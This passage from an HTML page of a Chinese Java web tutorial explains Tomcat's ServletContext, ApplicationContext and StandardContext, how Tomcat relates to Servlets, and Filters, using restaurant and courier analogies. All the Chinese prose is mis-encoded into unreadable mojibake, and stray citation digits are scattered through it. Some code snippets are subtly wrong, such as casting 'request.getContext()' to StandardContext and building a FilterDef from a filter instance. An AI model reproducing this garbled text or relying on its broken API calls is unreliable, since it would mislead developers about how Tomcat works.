class="string">&quot;database_url&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ul><p><strong>æ¼”å‘˜åå•</strong>ï¼ˆServlet&#x2F;Filter&#x2F;Listener é…ç½®ï¼‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŠ¨æ€æ·»åŠ ä¸€ä¸ªâ€œç¾¤æ¼”â€ï¼ˆServletï¼‰</span></span><br><span class="line">ServletRegistration.<span class="type">Dynamic</span> <span class="variable">servlet</span> <span class="operator">=</span> context.addServlet(<span class="string">&quot;MyServlet&quot;</span>, MyServlet.class);</span><br><span class="line">servlet.addMapping(<span class="string">&quot;/my-url&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>æ‹æ‘„åœºåœ°åœ°å›¾</strong>ï¼ˆèµ„æºè·¯å¾„ï¼‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è·å–æ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„çœŸå®è·¯å¾„ï¼ˆæ¯”å¦‚æ‰¾å‰§æœ¬æ–‡ä»¶ï¼‰</span></span><br><span class="line"><span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> context.getRealPath(<span class="string">&quot;/WEB-INF/config.xml&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><hr><h3 id="StandardContext-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#StandardContext-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="StandardContext æ˜¯ä»€ä¹ˆï¼Ÿ"></a><strong>StandardContext æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3><p><strong>StandardContext å°±æ˜¯ Tomcat çš„ã€ŒåŒ…è£¹å¤„ç†ä¸­æ¢ã€</strong>ï¼Œå®ƒè´Ÿè´£ï¼š</p><ol><li><strong>ç®¡ç†æ‰€æœ‰å¿«é€’å‘˜ï¼ˆServlet&#x2F;Filter&#x2F;Listenerï¼‰</strong>ï¼šè®°å½•æ¯ä¸ªå¿«é€’å‘˜è´Ÿè´£çš„åŒºåŸŸï¼ˆURL è·¯å¾„ï¼‰å’Œæ“ä½œè§„èŒƒï¼ˆé…ç½®ï¼‰</li><li><strong>ç›‘æ§åŒ…è£¹ï¼ˆè¯·æ±‚ï¼‰æµè½¬</strong>ï¼šä»å¿«é€’è½¦ï¼ˆHTTP è¯·æ±‚ï¼‰åˆ°è¾¾åˆ†æ‹£ä¸­å¿ƒå¼€å§‹ï¼Œåˆ°åŒ…è£¹æ´¾é€å®Œæˆï¼ˆå“åº”è¿”å›ï¼‰çš„å…¨æµç¨‹</li><li><strong>å¤„ç†çªå‘äº‹ä»¶</strong>ï¼šæ¯”å¦‚åŒ…è£¹ç ´æŸï¼ˆè¯·æ±‚é”™è¯¯ï¼‰ã€è¶…é‡ï¼ˆè¯·æ±‚æ•°æ®è¿‡å¤§ï¼‰ç­‰æƒ…å†µ</li></ol><hr><h3 id="å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ"><a href="#å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ" class="headerlink" title="å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ"></a><strong>å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ</strong></h3><ol><li><p><strong>åŒ…è£¹ç™»è®°å¤„</strong></p><ul><li><p>æ¯ä¸ªæ–°åˆ°çš„å¿«é€’ï¼ˆWeb åº”ç”¨ï¼‰éƒ½è¦åœ¨è¿™é‡Œæ³¨å†Œä¿¡æ¯ï¼Œæ¯”å¦‚ï¼š</p><ul><li><p>ğŸ“¦ åŒ…è£¹ç±»å‹ï¼šæ˜¯æ–‡ä»¶ï¼ˆé™æ€èµ„æºï¼‰è¿˜æ˜¯ç”Ÿé²œï¼ˆåŠ¨æ€è¯·æ±‚ï¼‰ï¼Ÿ</p><p><strong>2</strong></p></li><li><p>ğŸ“¦ æ´¾é€è§„åˆ™ï¼šå“ªäº›å¿«é€’å‘˜ï¼ˆServletï¼‰å¤„ç†å“ªäº›åŒºåŸŸçš„åŒ…è£¹ï¼Ÿ</p><p><strong>2</strong></p></li></ul></li></ul></li><li><p><strong>å¿«é€’å‘˜è°ƒåº¦ä¸­å¿ƒ</strong></p><ul><li><p>ç®¡ç†ä¸‰å¤§ç±»å·¥ä½œäººå‘˜ï¼š</p><ul><li><p>ğŸšš </p><p>å¸è´§ç»„ï¼ˆListenerï¼‰</p><p>ï¼šåŒ…è£¹åˆšåˆ°åˆ†æ‹£ä¸­å¿ƒæ—¶æ£€æŸ¥å¤–åŒ…è£…ï¼ˆè¯·æ±‚åˆå§‹åŒ–ï¼‰</p><hr></li><li><p>ğŸ” <strong>åˆ†æ‹£ç»„ï¼ˆFilterï¼‰</strong>ï¼šç»™åŒ…è£¹è´´æ ‡ç­¾ã€æ¶ˆæ¯’ï¼ˆå‚æ•°å¤„ç†&#x2F;å®‰å…¨æ£€æŸ¥ï¼‰</p></li><li><p>ğŸš› <strong>æ´¾é€ç»„ï¼ˆServletï¼‰</strong>ï¼šæŠŠåŒ…è£¹é€åˆ°æ­£ç¡®åœ°å€ï¼ˆç”Ÿæˆå“åº”ï¼‰</p></li></ul></li></ul></li><li><p><strong>å¼‚å¸¸å¤„ç†æœºåˆ¶</strong></p><ul><li><p>å¦‚æœå‘ç°å±é™©å“ï¼ˆæ¶æ„è¯·æ±‚ï¼‰ï¼Œä¼šå¯åŠ¨ï¼š</p><ul><li><p>ğŸ”’ è‡ªåŠ¨æ‹¦æˆªï¼ˆè¿”å› 403 é”™è¯¯ï¼‰</p></li><li><p>ğŸ“¢ è§¦å‘è­¦æŠ¥ï¼ˆè®°å½•æ—¥å¿—&#x2F;é€šçŸ¥ç®¡ç†å‘˜ï¼‰</p><hr></li></ul></li></ul></li></ol><hr><h3 id="å’Œ-ApplicationContext-çš„åŒºåˆ«-6"><a href="#å’Œ-ApplicationContext-çš„åŒºåˆ«-6" class="headerlink" title="å’Œ ApplicationContext çš„åŒºåˆ«****6"></a><strong>å’Œ ApplicationContext çš„åŒºåˆ«****6</strong></h3><table><thead><tr><th align="center"></th><th align="center">StandardContextï¼ˆå¿«é€’åˆ†æ‹£ä¸­å¿ƒï¼‰</th><th align="center">ApplicationContextï¼ˆæ™ºèƒ½ä¸­å¤®å¨æˆ¿ï¼‰</th></tr></thead><tbody><tr><td align="center"><strong>æ‰€å±ç³»ç»Ÿ</strong></td><td align="center">Tomcat ä¸“å±</td><td align="center">Spring æ¡†æ¶ä¸“å±</td></tr><tr><td align="center"><strong>ä¸»è¦åŠŸèƒ½</strong></td><td align="center">ç®¡ç† Web åº”ç”¨çš„è¯·æ±‚å¤„ç†æµç¨‹</td><td align="center">ç®¡ç† Spring Bean å’Œä¾èµ–æ³¨å…¥</td></tr><tr><td align="center"><strong>æ•°æ®å­˜å‚¨</strong></td><td align="center">å­˜ Servlet&#x2F;Filter é…ç½®</td><td align="center">å­˜ä¸šåŠ¡å¯¹è±¡å’Œç»„ä»¶å…³ç³»</td></tr><tr><td align="center"><strong>å…¸å‹æ“ä½œ</strong></td><td align="center">æ·»åŠ ç›‘å¬å™¨ã€é…ç½®é”™è¯¯é¡µé¢</td><td align="center">åŠ è½½é…ç½®æ–‡ä»¶ã€ç®¡ç†äº‹åŠ¡</td></tr></tbody></table><hr><h3 id="å®é™…å¼€å‘ä¸­çš„å­˜åœ¨æ„Ÿ"><a href="#å®é™…å¼€å‘ä¸­çš„å­˜åœ¨æ„Ÿ" class="headerlink" title="å®é™…å¼€å‘ä¸­çš„å­˜åœ¨æ„Ÿ"></a><strong>å®é™…å¼€å‘ä¸­çš„å­˜åœ¨æ„Ÿ</strong></h3><p>å½“ä½ åœ¨ Tomcat çš„ <code>conf/server.xml</code> é‡Œå†™è¿™æ ·çš„é…ç½®æ—¶ï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Context</span> <span class="attr">path</span>=<span class="string">&quot;/shop&quot;</span> <span class="attr">docBase</span>=<span class="string">&quot;D:\myapp&quot;</span> <span class="attr">reloadable</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>èƒŒåçš„ <strong>StandardContext</strong> å°±ä¼šï¼š</p><ol><li>ğŸ“‚ æŠŠ <code>D:\myapp</code> æ–‡ä»¶å¤¹è¯†åˆ«ä¸ºã€Œshop ä¸“åŒºã€</li><li>ğŸ”„ å¼€å¯è‡ªåŠ¨ç›‘æ§ï¼ˆreloadableï¼‰ï¼Œæ–‡ä»¶æ”¹åŠ¨æ—¶è‡ªåŠ¨åˆ·æ–°</li><li>ğŸ›¡ï¸ ç»™è¿™ä¸ªä¸“åŒºåˆ†é…ç‹¬ç«‹çš„å®‰å…¨ç­–ç•¥ï¼ˆæ¯”å¦‚å•ç‹¬çš„ç™»å½•éªŒè¯ï¼‰</li></ol><hr><h3 id="ä¸€å¥è¯æ€»ç»“"><a href="#ä¸€å¥è¯æ€»ç»“" class="headerlink" title="ä¸€å¥è¯æ€»ç»“"></a><strong>ä¸€å¥è¯æ€»ç»“</strong></h3><p><strong>StandardContext å°±æ˜¯ Tomcat çš„ã€Œåˆ†æ‹£ä¸­å¿ƒä¸»ç®¡ã€</strong>ï¼Œå®ƒçŸ¥é“ï¼š</p><ul><li>æ¯ä¸ªåŒ…è£¹ï¼ˆè¯·æ±‚ï¼‰è¯¥èµ°å“ªæ¡æµæ°´çº¿ ğŸšš</li><li>æ‰€æœ‰å·¥ä½œäººå‘˜ï¼ˆServlet&#x2F;Filterï¼‰çš„æ’ç­è¡¨ ğŸ“…</li><li>é‡åˆ°çªå‘çŠ¶å†µæ—¶è¯¥å¯åŠ¨å“ªå¥—åº”æ€¥é¢„æ¡ˆ ğŸš¨</li></ul><p>æ²¡æœ‰å®ƒï¼ŒTomcat å°±åƒæ²¡æœ‰è°ƒåº¦ç³»ç»Ÿçš„å¿«é€’ç«™ï¼ŒåŒ…è£¹ä¼šä¹±æˆä¸€é”…ç²¥ï¼</p><h3 id="ä¸€ã€ä¸‰ç§-Context-çš„å…³ç³»ä¸è§’è‰²"><a href="#ä¸€ã€ä¸‰ç§-Context-çš„å…³ç³»ä¸è§’è‰²" class="headerlink" title="ä¸€ã€ä¸‰ç§ Context çš„å…³ç³»ä¸è§’è‰²"></a><strong>ä¸€ã€ä¸‰ç§ Context çš„å…³ç³»ä¸è§’è‰²</strong></h3><table><thead><tr><th align="center"></th><th align="center"><strong>ServletContext</strong></th><th align="center"><strong>ApplicationContext</strong></th><th align="center"><strong>StandardContext</strong></th></tr></thead><tbody><tr><td align="center"><strong>èº«ä»½å®šä½</strong></td><td align="center">å®˜æ–¹èœå•ï¼ˆè§„èŒƒï¼‰<strong>3</strong></td><td align="center">å‰å°æ¥å¾…ï¼ˆé—¨é¢ï¼‰<strong>2****3</strong></td><td align="center">åå¨ä¸»ç®¡ï¼ˆå®é™…å¹²æ´»ï¼‰<strong>2****6</strong></td></tr><tr><td align="center"><strong>èŒè´£</strong></td><td align="center">è§„å®šé¤å…è¦æœ‰å“ªäº›åŠŸèƒ½ï¼ˆæ¥å£ï¼‰</td><td align="center">å¯¹å¤–éšè—åå¨ç»†èŠ‚ï¼Œåªå±•ç¤ºè§„èŒƒåŠŸèƒ½</td><td align="center">å®é™…å®‰æ’å¨å¸ˆã€å¤‡èœã€å¤„ç†è®¢å•</td></tr><tr><td align="center"><strong>å­˜åœ¨æ„Ÿ</strong></td><td align="center">é¡¾å®¢çœ‹ä¸è§ï¼Œä½†æ‰€æœ‰èœå“éƒ½æŒ‰å®ƒåˆ¶ä½œ</td><td align="center">æœåŠ¡å‘˜æ‹¿èœå•ç»™é¡¾å®¢çœ‹</td><td align="center">åœ¨å¨æˆ¿é‡Œå¼ç€è°ƒåº¦äººå‘˜</td></tr></tbody></table><hr><h3 id="äºŒã€å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ"><a href="#äºŒã€å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ" class="headerlink" title="äºŒã€å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ"></a><strong>äºŒã€å…·ä½“åŠŸèƒ½å¤§ç™½è¯ç‰ˆ</strong></h3><h4 id="1-ServletContext-â€”â€”-å®˜æ–¹ã€Šé¤é¥®ä¸šæ ‡å‡†èœå•ã€‹"><a href="#1-ServletContext-â€”â€”-å®˜æ–¹ã€Šé¤é¥®ä¸šæ ‡å‡†èœå•ã€‹" class="headerlink" title="1. ServletContext â€”â€” å®˜æ–¹ã€Šé¤é¥®ä¸šæ ‡å‡†èœå•ã€‹"></a><strong>1. ServletContext â€”â€” å®˜æ–¹ã€Šé¤é¥®ä¸šæ ‡å‡†èœå•ã€‹</strong></h4><p>- </p><p>  ä½œç”¨</p><p>  ï¼šå›½å®¶è§„å®šæ‰€æœ‰é¤å…å¿…é¡»æ”¯æŒçš„åŠŸèƒ½ï¼Œæ¯”å¦‚ï¼š</p><ul><li><p>ğŸ“œ <strong>å¿…é¡»èƒ½æŸ¥èœå“ä»·æ ¼</strong> â†’ <code>getInitParameter(&quot;æŠ˜æ‰£&quot;)</code></p></li><li><p>ğŸ“œ <strong>å¿…é¡»æœ‰æœåŠ¡å‘˜åå•</strong> â†’ <code>getServletRegistrations()</code></p></li><li><p>ğŸ“œ <strong>å¿…é¡»èƒ½è®°å½•å®¢æµé‡</strong> â†’ <code>setAttribute(&quot;ä»Šæ—¥å®¢æµ&quot;, 1000)</code></p></li><li><p>ç‰¹ç‚¹</p><p>ï¼š</p><ul><li><p>æ‰€æœ‰é¤å…ï¼ˆWeb åº”ç”¨ï¼‰éƒ½å¿…é¡»éµå®ˆè¿™å¥—è§„èŒƒ</p><p><strong>3</strong></p></li><li><p>é¡¾å®¢ï¼ˆå¼€å‘è€…ï¼‰çœ‹ä¸åˆ°å®ƒï¼Œä½†èœå•ï¼ˆåŠŸèƒ½ï¼‰éƒ½æ˜¯å®ƒè§„å®šçš„</p></li></ul></li></ul><h4 id="2-ApplicationContext-â€”â€”-é¤å…å‰å°æœåŠ¡å‘˜"><a href="#2-ApplicationContext-â€”â€”-é¤å…å‰å°æœåŠ¡å‘˜" class="headerlink" title="2. ApplicationContext â€”â€” é¤å…å‰å°æœåŠ¡å‘˜"></a><strong>2. ApplicationContext â€”â€” é¤å…å‰å°æœåŠ¡å‘˜</strong></h4><p>- </p><p>  ä½œç”¨</p><p>  ï¼šæŠŠå¤æ‚çš„åå¨æ“ä½œåŒ…è£…æˆç®€å•æŒ‡ä»¤ï¼Œæ¯”å¦‚ï¼š</p><ul><li><p>ğŸ§‘ğŸ³ <strong>åŠ æ–°èœ</strong> â†’ <code>addServlet(&quot;éº»è¾£é¦™é”…&quot;, SpicyPot.class)</code></p></li><li><p>ğŸ§¹ <strong>æ¢é¤å…·</strong> â†’ <code>addFilter(&quot;æ¶ˆæ¯’è¿‡æ»¤å™¨&quot;, DisinfectionFilter.class)</code></p></li><li><p>ç‰¹ç‚¹</p><p>ï¼š</p><ul><li><p>å¯¹é¡¾å®¢ï¼ˆå¼€å‘è€…ï¼‰éšè—äº†åå¨åˆ‡èœã€ç‚’èœçš„è¿‡ç¨‹ï¼ˆåº•å±‚ StandardContext çš„å¤æ‚æ“ä½œï¼‰</p><p><strong>2</strong></p></li><li><p>æœ¬è´¨æ˜¯ StandardContext çš„â€œé©¬ç”²â€ï¼ˆé—¨é¢æ¨¡å¼ï¼‰</p><p><strong>3</strong></p></li></ul></li></ul><h4 id="3-StandardContext-â€”â€”-æš´èºåå¨ä¸»ç®¡"><a href="#3-StandardContext-â€”â€”-æš´èºåå¨ä¸»ç®¡" class="headerlink" title="3. StandardContext â€”â€” æš´èºåå¨ä¸»ç®¡"></a><strong>3. StandardContext â€”â€” æš´èºåå¨ä¸»ç®¡</strong></h4><p>- </p><p>  å®é™…å¹²æ´»</p><p>  ï¼š</p><ul><li><p>ğŸ“Œ <strong>ç®¡ç†æ‰€æœ‰å¨å¸ˆ</strong>ï¼ˆServlet&#x2F;Filter&#x2F;Listenerï¼‰çš„æ’ç­è¡¨</p></li><li><p>ğŸ“Œ </p><p>ç›‘æ§è®¢å•æµç¨‹</p><p>ï¼šä»æ¥å•åˆ°ä¸Šèœçš„æ¯ä¸ªç¯èŠ‚ï¼ˆPipeline-Valve è´£ä»»é“¾ï¼‰</p><p><strong>6</strong></p></li><li><p>ğŸ“Œ <strong>å¤„ç†çªå‘çŠ¶å†µ</strong>ï¼šæ¯”å¦‚é£Ÿæä¸è¶³ï¼ˆè¯·æ±‚é”™è¯¯ï¼‰æ—¶å¯åŠ¨å¤‡ç”¨æ–¹æ¡ˆ</p></li><li><p>é…ç½®æ–¹å¼</p><p>ï¼ˆä¸‰ç§åå¨ç®¡ç†æ¨¡å¼ï¼‰ï¼š</p><ul><li><p>ğŸ“‚ </p><p>é»˜è®¤æ¨¡å¼</p><p>ï¼šæŠŠèœè°±ï¼ˆWAR åŒ…ï¼‰ä¸¢è¿›å›ºå®šæŸœå­ï¼ˆwebapps ç›®å½•ï¼‰ï¼Œè‡ªåŠ¨è¯†åˆ«</p><p><strong>4</strong></p></li><li><p>ğŸ“ </p><p>æ‰‹å†™æ¨¡å¼</p><p>ï¼šåœ¨æ€»è´¦æœ¬ï¼ˆserver.xmlï¼‰é‡Œå†™æ­»èœå•ï¼Œé‡å¯ç”Ÿæ•ˆ</p><p><strong>4</strong></p></li><li><p>ğŸ—’ï¸ </p><p>ä¾¿åˆ©è´´æ¨¡å¼</p><p>ï¼šåœ¨å¨æˆ¿å¢™ä¸Šè´´ä¾¿åˆ©è´´ï¼ˆconf&#x2F;Catalina ç›®å½•ä¸‹çš„ XMLï¼‰ï¼Œéšæ—¶ä¿®æ”¹</p><p><strong>4</strong></p><p><strong>6</strong></p></li></ul></li></ul><hr><h3 id="ä¸‰ã€å®é™…å¼€å‘ä¸­çš„ç»å…¸åœºæ™¯"><a href="#ä¸‰ã€å®é™…å¼€å‘ä¸­çš„ç»å…¸åœºæ™¯" class="headerlink" title="ä¸‰ã€å®é™…å¼€å‘ä¸­çš„ç»å…¸åœºæ™¯"></a><strong>ä¸‰ã€å®é™…å¼€å‘ä¸­çš„ç»å…¸åœºæ™¯</strong></h3><h4 id="åœºæ™¯-1ï¼šç»Ÿè®¡å…¨ç«™è®¿é—®é‡"><a href="#åœºæ™¯-1ï¼šç»Ÿè®¡å…¨ç«™è®¿é—®é‡" class="headerlink" title="åœºæ™¯ 1ï¼šç»Ÿè®¡å…¨ç«™è®¿é—®é‡"></a><strong>åœºæ™¯ 1ï¼šç»Ÿè®¡å…¨ç«™è®¿é—®é‡</strong></h4><p>java</p><p>å¤åˆ¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç”¨ ServletContext å­˜å…¨å±€è®¡æ•°</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletContext();</span><br><span class="line">context.setAttribute(<span class="string">&quot;visit_count&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¯æ¬¡è®¿é—®æ—¶ +1</span></span><br><span class="line"><span class="keyword">synchronized</span>(context) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> (<span class="type">int</span>) context.getAttribute(<span class="string">&quot;visit_count&quot;</span>);</span><br><span class="line">    context.setAttribute(<span class="string">&quot;visit_count&quot;</span>, count + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åœºæ™¯-2ï¼šåŠ¨æ€æ·»åŠ æ¥å£"><a href="#åœºæ™¯-2ï¼šåŠ¨æ€æ·»åŠ æ¥å£" class="headerlink" title="åœºæ™¯ 2ï¼šåŠ¨æ€æ·»åŠ æ¥å£"></a><strong>åœºæ™¯ 2ï¼šåŠ¨æ€æ·»åŠ æ¥å£</strong></h4><p>java</p><p>å¤åˆ¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡ ApplicationContext åŠ æ–°åŠŸèƒ½</span></span><br><span class="line">ServletRegistration.<span class="type">Dynamic</span> <span class="variable">servlet</span> <span class="operator">=</span> context.addServlet(<span class="string">&quot;ApiServlet&quot;</span>, ApiServlet.class);</span><br><span class="line">servlet.addMapping(<span class="string">&quot;/api/*&quot;</span>);</span><br></pre></td></tr></table></figure><h4 id="åœºæ™¯-3ï¼šç´§æ€¥å°ç¦-IP"><a href="#åœºæ™¯-3ï¼šç´§æ€¥å°ç¦-IP" class="headerlink" title="åœºæ™¯ 3ï¼šç´§æ€¥å°ç¦ IP"></a><strong>åœºæ™¯ 3ï¼šç´§æ€¥å°ç¦ IP</strong></h4><p>java</p><p>å¤åˆ¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ“ä½œ StandardContext åŠ é»‘åå•è¿‡æ»¤å™¨</span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">stdContext</span> <span class="operator">=</span> (StandardContext) request.getContext(); <span class="comment">// è·å–åå¨ä¸»ç®¡</span></span><br><span class="line">stdContext.addFilter(<span class="keyword">new</span> <span class="title class_">FilterDef</span>(<span class="keyword">new</span> <span class="title class_">IpBlockFilter</span>())); <span class="comment">// å¡ä¸ªè¿‡æ»¤å™¨ç»™ä»–</span></span><br></pre></td></tr></table></figure><hr><h3 id="å››ã€ä¸€å¥è¯æ€»ç»“"><a href="#å››ã€ä¸€å¥è¯æ€»ç»“" class="headerlink" title="å››ã€ä¸€å¥è¯æ€»ç»“"></a><strong>å››ã€ä¸€å¥è¯æ€»ç»“</strong></h3><ul><li><strong>ServletContext</strong> æ˜¯è¡Œä¸šæ ‡å‡†ï¼ˆèœå•å¿…é¡»æœ‰å“ªäº›èœï¼‰</li><li><strong>ApplicationContext</strong> æ˜¯æœåŠ¡å‘˜ï¼ˆæŒ‰æ ‡å‡†ç»™é¡¾å®¢ç‚¹èœï¼‰</li><li><strong>StandardContext</strong> æ˜¯åå¨ï¼ˆå®é™…ç‚’èœã€å¤„ç†è®¢å•ï¼‰</li></ul><p>ä¸‰è€…å°±åƒé¤å…çš„ <strong>ã€Œæ ‡å‡† â†’ æ¥å£ â†’ å®ç°ã€</strong>ï¼Œå…±åŒä¿è¯ Tomcat èƒ½é«˜æ•ˆå¤„ç†æ¯ä¸ªè¯·æ±‚ï¼</p><h1 id="TomCatä¸Servletçš„å…³ç³»"><a href="#TomCatä¸Servletçš„å…³ç³»" class="headerlink" title="TomCatä¸Servletçš„å…³ç³»"></a>TomCatä¸Servletçš„å…³ç³»</h1><p><a href="https://blog.csdn.net/weixin_46225503/article/details/135307399">https://blog.csdn.net/weixin_46225503/article/details/135307399</a></p><p><strong>æƒ³è±¡ä¸€ä¸ªé¤å…ï¼š</strong></p><ul><li><strong>Tomcat</strong> å°±åƒé¤å…çš„å‰å°å’Œä¼ èœå‘˜ã€‚å®ƒè´Ÿè´£æ¥å¾…å®¢äººï¼ˆæ¥æ”¶æµè§ˆå™¨å‘æ¥çš„è¯·æ±‚ï¼‰ï¼Œå®‰æ’åº§ä½ï¼ˆç®¡ç†ç½‘ç»œè¿æ¥ï¼‰ï¼Œç„¶åæŠŠå®¢äººç‚¹çš„èœå•äº¤ç»™åå¨ï¼ˆServletï¼‰ï¼Œæœ€åæŠŠåšå¥½çš„èœç«¯å›ç»™å®¢äººï¼ˆæŠŠå¤„ç†ç»“æœè¿”å›ç»™æµè§ˆå™¨ï¼‰ã€‚</li><li><strong>Servlet</strong> å°±åƒåå¨çš„å¨å¸ˆã€‚å®ƒä¸ç›´æ¥å’Œå®¢äººæ‰“äº¤é“ï¼Œä½†æ‹¿åˆ°èœå•ï¼ˆHTTPè¯·æ±‚ï¼‰åï¼Œè´Ÿè´£æŒ‰éœ€æ±‚ç‚’èœï¼ˆå¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œæ¯”å¦‚ç™»å½•ã€æŸ¥è¯¢æ•°æ®ï¼‰ï¼Œç„¶åæŠŠç‚’å¥½çš„èœï¼ˆç”Ÿæˆçš„HTMLé¡µé¢æˆ–æ•°æ®ï¼‰äº¤ç»™ä¼ èœå‘˜ï¼ˆTomcatï¼‰ã€‚</li></ul><hr><p><strong>å…·ä½“å…³ç³»ï¼š</strong></p><ol><li><strong>Tomcat æ˜¯ Servlet çš„â€œè¿è¡Œç¯å¢ƒâ€</strong><br>å°±åƒæ‰‹æœºéœ€è¦å®‰å“&#x2F;iOSç³»ç»Ÿæ‰èƒ½è¿è¡ŒAPPä¸€æ ·ï¼ŒServlet å¿…é¡»æ”¾åœ¨ Tomcat è¿™ç±»â€œå®¹å™¨â€é‡Œæ‰èƒ½å·¥ä½œã€‚Tomcat è´Ÿè´£ç®¡ç† Servlet çš„åˆ›å»ºã€è°ƒç”¨å’Œé”€æ¯ã€‚</li><li><strong>åˆ†å·¥æ˜ç¡®</strong><ul><li><strong>Tomcat å¹²ç²—æ´»</strong>ï¼šå¤„ç†ç½‘ç»œé€šä¿¡ï¼ˆç›‘å¬ç«¯å£ã€è§£æHTTPåè®®ï¼‰ã€å¤šçº¿ç¨‹ç®¡ç†ã€å®‰å…¨æ€§ç­‰åº•å±‚ç»†èŠ‚ã€‚</li><li><strong>Servlet å¹²ç»†æ´»</strong>ï¼šä¸“æ³¨å†™ä¸šåŠ¡é€»è¾‘ï¼ˆæ¯”å¦‚ç”¨æˆ·æ³¨å†Œã€æ•°æ®æŸ¥è¯¢ï¼‰ï¼Œä¸ç”¨ç®¡ç½‘ç»œæ€ä¹ˆä¼ æ•°æ®ã€‚</li></ul></li><li><strong>åä½œæµç¨‹</strong><br>å½“ä½ åœ¨æµè§ˆå™¨è¾“å…¥ç½‘å€æ—¶ï¼š<ul><li>Tomcat å…ˆæ¥æ”¶åˆ°è¯·æ±‚ï¼Œåˆ†æè¦æ‰¾å“ªä¸ª Servletï¼ˆæ¯”å¦‚å¤„ç†ç™»å½•çš„ LoginServletï¼‰ã€‚</li><li>Tomcat è°ƒç”¨å¯¹åº”çš„ Servletï¼ŒæŠŠè¯·æ±‚ä¿¡æ¯ï¼ˆå‚æ•°ã€è¯·æ±‚å¤´ç­‰ï¼‰ä¼ ç»™å®ƒã€‚</li><li>Servlet å¤„ç†å®Œï¼ŒæŠŠç»“æœï¼ˆæ¯”å¦‚ç”Ÿæˆçš„HTMLé¡µé¢ï¼‰äº¤ç»™ Tomcatã€‚</li><li>Tomcat æŠŠç»“æœåŒ…è£…æˆHTTPå“åº”ï¼Œå‘å›ç»™æµè§ˆå™¨ã€‚</li></ul></li></ol><hr><p><strong>ä¸€å¥è¯æ€»ç»“ï¼š</strong><br>Tomcat æ˜¯ Servlet çš„â€œæœåŠ¡å‘˜+ç®¡å®¶â€ï¼ŒServlet æ˜¯ Tomcat çš„â€œæ‰“å·¥äººâ€ã€‚æ²¡æœ‰ Tomcatï¼ŒServlet æ— æ³•ç‹¬ç«‹å·¥ä½œï¼›æ²¡æœ‰ Servletï¼ŒTomcat åªæ˜¯ä¸ªç©ºå£³ã€‚</p><h1 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h1><p>Filterï¼ˆè¿‡æ»¤å™¨ï¼‰å°±åƒæ˜¯ä½ åœ¨ç½‘ä¸Šç‚¹å¤–å–æ—¶å€™çš„â€ä¸­é—´å•†â€ã€‚æ¯”å¦‚ä½ ä¸‹å•åï¼Œå¤–å–å°å“¥é€é¤å‰ä¼šå…ˆæ£€æŸ¥ä½ çš„è®¢å•æ˜¯å¦æ­£å¸¸ï¼Œæœ‰æ²¡æœ‰è¿ç¦å“ï¼Œæˆ–è€…ç»™ä½ çš„é¤ç›’åŠ ä¸ªä¿æ¸©è¢‹ï¼Œè¿™å°±ç›¸å½“äºè¿‡æ»¤å™¨çš„ä½œç”¨ã€‚</p><p>JavaWeb çš„ä¸‰å¤§ç®¡å®¶ï¼š</p><ol><li>Servletï¼šè´Ÿè´£å¤„ç†è¯·æ±‚ï¼ˆåƒé¤å…åå¨ï¼‰</li><li>Filterï¼šè´Ÿè´£æ£€æŸ¥&#x2F;åŠ å·¥è¯·æ±‚å’Œå“åº”ï¼ˆåƒå¤–å–æ‰“åŒ…å‘˜ï¼‰</li><li>Listenerï¼šè´Ÿè´£ç›‘å¬äº‹ä»¶ï¼ˆåƒç›‘æ§æ‘„åƒå¤´ï¼‰</li></ol><p>è¿‡æ»¤å™¨å…·ä½“èƒ½å¹²è¿™äº›äº‹ï¼š</p><ul><li>è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨å‰ï¼šå¯ä»¥æ£€æŸ¥ç”¨æˆ·æ˜¯å¦ç™»å½•ï¼ˆåƒè¿›å°åŒºè¦åˆ·å¡ï¼‰</li><li>æœåŠ¡å™¨å¤„ç†è¯·æ±‚æ—¶ï¼šå¯ä»¥ç»™è¯·æ±‚æ•°æ®æ¶ˆæ¯’ï¼ˆåƒç»™å¿«é€’æ¶ˆæ¯’ï¼‰</li><li>æœåŠ¡å™¨è¿”å›å“åº”æ—¶ï¼šå¯ä»¥å‹ç¼©æ•°æ®ï¼ˆåƒå¿«é€’æ‰“åŒ…ï¼‰</li><li>è¿”å›ç»™ç”¨æˆ·å‰ï¼šå¯ä»¥å±è”½æ•æ„Ÿè¯ï¼ˆåƒè‡ªåŠ¨æ‰“é©¬èµ›å…‹ï¼‰</li></ul><p>ä¸¾ä¸ªä¾‹å­ï¼š<br>æ¯”å¦‚ä½ 